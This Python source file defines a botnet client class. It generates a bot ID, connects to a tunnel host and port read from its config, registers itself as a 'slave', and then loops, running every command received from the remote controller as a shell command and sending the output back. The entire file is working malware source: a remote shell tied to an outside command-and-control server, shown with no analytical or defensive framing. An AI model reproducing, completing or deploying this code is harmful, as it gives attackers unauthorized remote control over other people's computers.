import shlex
import subprocess
from prototype import BotnetInterface, Envelope, socket, error, AF_INET, SOCK_STREAM, random, hashlib


class BotNet:
    bot_id: str
    interface: BotnetInterface
    online: bool
    notified: bool
    config = dict

    def __init__(self):
        self.interface = BotnetInterface(insocket=None, outsocket=socket(AF_INET, SOCK_STREAM), self_type="BotNet")
        self.interface.populate()
        self.config = self.interface.config
        self.bot_id = hashlib.md5(hashlib.sha1(random.random().hex().encode()).hexdigest().encode()).hexdigest()

    def connect(self):
        tunnel = self.config.get('tunnel')
        self.online = self.interface.connect((tunnel.get("url"), tunnel.get("port")))

    def send(self, data=None):
        self.interface.send(data=data)

    def receive(self):
        return self.interface.receive()

    def __notify__(self):
        envelope = Envelope(data=self.bot_id)
        self.send(data=envelope)
        gotcha = self.receive()
        self.notified = gotcha.DataText

    def run(self):
        while True:
            self.interface.outgoing.settimeout(None)
            self.connect()
            self.__notify__()
            envelope = Envelope(data='slave')
            self.interface.send(data=envelope)
            while self.online and self.notified:
                data = self.interface.receive()
                proc = subprocess.Popen(
                    [data],
                    shell=True,
                    stderr=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stdin=subprocess.PIPE
                    )
                stdout = proc.stderr.read() + proc.stdout.read()
                envelope = Envelope(data=stdout)
                self.interface.send(data=envelope)
